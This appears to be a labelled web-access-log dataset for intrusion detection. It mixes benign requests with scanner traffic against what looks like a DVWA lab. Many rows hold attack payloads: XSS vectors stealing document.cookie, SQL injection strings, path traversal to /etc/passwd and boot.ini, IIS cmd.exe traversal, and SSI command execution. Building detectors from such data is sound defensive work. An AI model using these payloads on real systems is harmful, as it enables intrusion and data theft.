Remote_host,Identd,REMOTE_USER,Date_time,Method,Path,Version,Status,Length,Label
172.17.0.1,-,-,12/Feb/2019:08:22:03 +0000,GET,/?username=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&Login=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&password=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/config/,HTTP/1.1,200,1395,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/js?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,301,740,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:04 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,"/phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+%00\\\""><script>alert('Vulnerable')</script>",HTTP/1.1,404,511,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
rpgopher.aist.go.jp,-,-,01/Aug/1995:00:01:58 -0400,GET,/ksc.html,HTTP/1.0,200,7280,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,../../../../../../../../../../etc/*,HTTP/1.1,400,485,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:45 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:49 +0000,GET,/dvwa/js/?query=ZAP,HTTP/1.1,200,1347,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query%27+UNION+ALL+select+NULL+--+,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>,HTTP/1.1,404,519,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>,HTTP/1.1,404,502,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/dvwa/js/dvwaPage.js?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,1296,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,POST,/login.php?query=query%27+UNION+ALL+select+NULL+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?Login=1+UNI%2F%2A%2A%2FON+SELECT+ALL+FROM+WHERE,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images/login_logo.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,200,9319,3.0
62.141.121.10,-,-,13/Dec/2015:13:27:33 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:28 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:27 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,POST,/setup.php?query=query%29+UNION+ALL+select+NULL+--+,HTTP/1.1,302,281,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/?user_token=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22,HTTP/1.1,302,300,1.0
5.140.31.161,-,-,13/Dec/2015:12:48:00 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js?query=query+UNION+ALL+select+NULL+--+,HTTP/1.1,301,602,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/.../.../.../,HTTP/1.1,404,502,3.0
37.19.35.108,-,-,13/Dec/2015:09:20:58 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:06 +0000,GET,/about.php,HTTP/1.1,200,5112,0.0
80.245.117.132,-,-,13/Dec/2015:08:30:38 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:43 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
boing.dgsys.com,-,-,01/Jul/1995:00:14:30 -0400,GET,/facts/faq11.html,HTTP/1.0,200,22096,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:12 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
pm110.spectra.net,-,-,01/Jul/1995:00:09:54 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:31 +0000,GET,/robots.txt?query=query+AND+1%3D2+--+,HTTP/1.1,200,254,2.0
172.17.0.1,-,-,12/Feb/2019:08:22:01 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:04 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:58 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:37 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3B+URL%3Dhttp%3A%2F%2F%3BURL%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
204.248.98.63,-,-,01/Jul/1995:00:18:05 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,3985,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:56 +0000,GET,/?password=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:46 +0000,GET,/dvwa/js/?query=RfQlwqOtulxomSgFfjktkeIaZnCJLNBqoAnYVVNEhqjRsqFxOBXCmYcHbMfqKcQVDqyxyBgqeVyDGdELfSdNfYblmeBiwWlrUNpSKRMpuDQTfFguiUTSDsgvoWFFpOVbeITtgycsmAtrXaBKfKUMrJdViwDlIblJKpxnxaIjrGkoNJcEgRerGyOJmLJihMxkNfToSOOSsnQDSOQasNCcSmMOmgahynCIIJGFYySDGcUqljUjDxKnATRaTRkjIHNFlAOwjGVERxCaPbuAsAlkBnXumuqKnOytHpSqLYGBXIBxhcptKvElKiZkNPNtiHcKhyOrPGcFtcyQAaPEcdWYdcscwdBkNfCfjKKowKBSDLwNHeCZvwRRAscXuMdypYYGIAgGlrViGXJEsdHdygDeFLvarVUcKROeAAUTvsimOehfJQecgVXXXSRRBtGkqbDutklHhuUYqSkGrHbqxyLoVhebOfmFvFZthbJoPTqpORTgEXHZvFqkUMLmAADKcqBRxMZfhJpWgJlqLeybCHcOJdohqQLynAssVqtduxHYPRrYQNdvqwJFFGwonqUUWIHAxJgmvpSsvxgEDpyvdDYVyaEsOhqkfGEbuRChSnHUReJFHVvNBGorDPDEgrHpiyZgoQeTOYcoYcArJgkQHGdMKeWQdXdjhpdWnjAAyWNYYXOOyRUQgFvoimfQKtyIYUlWSMbJlKGIYHeNdNmSxPcVsFoUkFoVgEaGhViWIFLhqNLbNituaYLgnZGVmZwAVJACsYUQYybiKkGoGDTrwSDLWbXaFJnBqKAJjAwSqKKQdysPlYsmGerjwSVSNWuCgOiNOaaqoxdHEEoLBaEHktvIyLHJElVKFCUmigihUxsudtvJoqnhVRtRFNMOicqWhnwsosDZvAxnbxGxHASOTBOdLnhOrBxwpZgEeYUOqALkBQfSGhjdwRvHjmuZSNDQJtyWWmcWPYLVBOTUumvSSQLuVTYKJRoUIgtGXIUfGnWGKqqpGXMIWNlAqGkjFjhHKijwHwgVoHvLVQjBdAEvgJKWZasKvQaLwpMmNgAtdyrCBPBdmINrFMHwTgfYHNloZEyCMOQWBMuGYJcxKpGOyDiDcCGKZNONoJrMtTZkklckOQSwuCVbxdnpsVVvmNxfWLdguZrwqGwVgDOSGAIqsCriCLCporhjsjAKOYBKDBaJidtFrTrxiQcsloOwRNhbdamTHXhNeGjLDdGeplOfJKEEeSQUfxeysUwKIHwWukNBgogsoRrbEoiViaEkMNQunjMdIuHgmcTYXFZqFyqJqZTVwqSfTFYpNVfYaLtHHhiGNSrIvboTgxQdmxWKGAiBYhtZoGwWtariNxUpRHImpGYsmojOWTHEaTBGMVabHFZCEYWOJciuYdrSrEGRafWXhFkkZowGWAQcgNeCyhlSqjIdDHPNyEDnxqFVKdjFkLibnCubclywhRcSFXMMZRQZiDGYlewkAQCBxOPKZUPErFLoKjxqGNvBwQZPpoMOiHVCAlfwHyAXLmogdsubTAnNiLDiEbSSgKGCSUMDbEeUBQyxKGXwXvIfvJgGNBkwNiCTYfOtcNtKMrXpHGOpCVnevkMCwCiBtUBCokIxEZtHNAwnUvvjgJcIWEoKIgYBUrpfgCDWwmJxyrdTDqSglpBmbfUWekQOJwreDHPNkYssGWmlJHbQkaCDIikyiCVnxhqqTSfwsaQyJCOfRnJspdGOxYoVDiVCTcPYggWJGEBRDpZenAvJoBVwoyGXljGSpqyrnaLRwVbkZohNHXybRgOZfMnqntKBjJIJDJpoiGcfmZiPgNMyjTbJQXJdIkflwwSOsahXUYoHkoXLSAOqeVScjUOFXsLJKcbRFkSYxwKZBSvKttMEucxRwJYInIhRRaRvuqMTQBXPZRQDqAMapLHFgQYBADrHpJmQaMBcZeeWoxOUAjwjbaLOJBDltxAxAIyfHYTYYRkiQgGTLMIGNbJptnlwFQAHWcFLVExQenWgMSrdycSMJiJZEyTSROvUytEFFYtywEoXKLFeOWKQsOhIrSktsVGhWxCmfCDpFjPHnQJXanOLMXKWdjwTUDwtloejaHgTbXZLuvhf,HTTP/1.1,200,1347,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/?user_token=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>,HTTP/1.1,404,520,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:49 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:47 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/OpenFile.aspx?file=../../../../../../../../../../boot.ini,HTTP/1.1,404,504,3.0
haraway.ucet.ufl.edu,-,-,01/Aug/1995:00:04:42 -0400,GET,/shuttle/countdown/,HTTP/1.0,200,4324,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:52 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,HTTP/1.1,301,732,3.0
46.211.46.18,-,-,13/Dec/2015:08:27:49 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00,HTTP/1.1,404,514,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:52 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:51 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:26 +0000,GET,/phpwebfilemgr/index.php?f=../../../../../../../../../etc,HTTP/1.1,404,514,3.0
172.17.0.1,-,-,12/Feb/2019:08:55:18 +0000,GET,/dvwa/js/dvwaPage.js?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,200,1296,2.0
www-d3.proxy.aol.com,-,-,01/Aug/1995:00:13:30 -0400,GET,/images/,HTTP/1.0,200,17688,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:42 +0000,GET,/login.php/,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?Login=%22OR+%221%22%3D%221,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:58 +0000,GET,/?username=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&user_token=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&Login=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&password=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:44 +0000,GET,/?Login=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/?user_token=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:27 +0000,GET,/dvwa/images/logo.png?query=query+OR+1%3D1+--+,HTTP/1.1,200,5275,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:32 +0000,GET,/?username=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/css/main.css?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,HTTP/1.1,200,4278,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:19 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
81.20.102.154,-,-,13/Dec/2015:12:21:58 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:20 +0000,GET,/instructions.php?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E,HTTP/1.1,200,14305,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:28 +0000,GET,/dvwa/js/add_event_listeners.js?query=query%27%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,858,2.0
109.184.11.34,-,-,12/Dec/2015:18:32:56 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>,HTTP/1.1,404,518,1.0
5.166.200.19,-,-,13/Dec/2015:14:13:53 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:30 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:13 +0000,GET,/login.php,HTTP/1.1,200,1795,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:42 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:11 +0000,GET,/dvwa/images/RandomStorm.png?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,HTTP/1.1,200,4746,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?Login=OR+1%3D1,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:21:49 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/css/main.css?query=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,HTTP/1.1,200,4278,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:28 +0000,GET,/forum1.asp?n=/....../boot.ini&amp;nn=269|200|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record.,HTTP/1.1,404,501,3.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/options.php?optpage=<script>alert('Vulnerable!')</script>,HTTP/1.1,404,501,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:54 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/index.php?dir=<script>alert('Vulnerable')</script>,HTTP/1.1,302,478,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:55 +0000,GET,/setup.php,HTTP/1.1,200,4428,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:33 +0000,GET,/docs/DVWA_v1.3.pdf?query=query%29+UNION+ALL+select+NULL+--+,HTTP/1.1,200,422251,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:21 +0000,GET,/login.php,HTTP/1.1,200,1845,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/?username=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:08:27 +0000,GET,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>,HTTP/1.1,404,511,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/?username=%5C%27%3B+GRABBER_SQL_STATEMENT%3B+--,HTTP/1.1,302,300,2.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,HTTP/1.1,404,535,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:31 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:36 +0000,GET,/?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:55 +0000,GET,/?password=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:43 +0000,GET,/?Login=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:55:17 +0000,GET,/dvwa/css/main.css?query=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,HTTP/1.1,200,4278,2.0
172.17.0.1,-,-,12/Feb/2019:08:55:23 +0000,GET,/docs/DVWA_v1.3.pdf,HTTP/1.1,200,422251,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:39 +0000,GET,/?user_token=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E,HTTP/1.1,302,300,3.0
66.249.66.19,-,-,13/Dec/2015:11:02:42 +0100,GET,/,HTTP/1.1,200,10479,0.0
80.66.158.11,-,-,13/Dec/2015:11:32:35 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:37 +0000,GET,/?user_token=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS,HTTP/1.1,302,300,1.0
109.188.126.7,-,-,13/Dec/2015:04:12:42 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0,HTTP/1.1,404,507,1.0
172.17.0.1,-,-,12/Feb/2019:08:22:01 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/?password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:48 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:25 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:35 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:26 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
109.106.143.62,-,-,12/Dec/2015:21:53:39 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:08:29 +0000,GET,/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir,HTTP/1.1,404,543,3.0
172.17.0.1,-,-,12/Feb/2019:08:21:53 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:40 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:57 +0000,GET,/?username=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&user_token=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&Login=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&password=%3CFRAMESET%3E%3CFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FFRAMESET%3E&,HTTP/1.1,302,300,1.0
172.17.0.1,-,-,12/Feb/2019:08:21:41 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:34 +0000,GET,/?user_token=%3CA+HREF%3D%22javascript%3Adocument.location%3D%27http%3A%2F%2Fwww.google.com%2F%27%22%3EXSS%3C%2FA%3E,HTTP/1.1,302,300,1.0
185.103.26.14,-,-,13/Dec/2015:12:06:00 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
178.167.78.166,-,-,13/Dec/2015:12:16:02 +0100,GET,/administrator/,HTTP/1.1,200,4263,0.0
172.17.0.1,-,-,12/Feb/2019:08:22:00 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:30 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:21:29 +0000,GET,/login.php,HTTP/1.1,200,1814,0.0
172.17.0.1,-,-,12/Feb/2019:08:55:52 +0000,GET,/about.php,HTTP/1.1,200,5843,0.0
